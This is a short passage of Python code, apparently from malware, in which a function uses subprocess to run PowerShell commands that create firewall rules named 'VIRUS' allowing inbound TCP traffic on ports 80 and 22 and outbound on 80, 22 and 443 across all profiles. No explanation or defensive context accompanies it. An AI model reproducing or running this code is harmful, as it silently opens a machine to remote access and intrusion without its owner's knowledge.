...
def shell_commands():
    ...
    time.sleep(0.1)
    subprocess.run(
        'powershell.exe New-NetFirewallRule -DisplayName "VIRUS" -Direction inbound -Profile Any -Action Allow -LocalPort 80,22 -Protocol TCP',
        shell=True)
    time.sleep(0.1)
    subprocess.run(
        'powershell.exe New-NetFirewallRule -DisplayName "VIRUS" -Direction outbound -Profile Any -Action Allow -LocalPort 80,22,443 -Protocol TCP',
        shell=True)
    time.sleep(0.1)
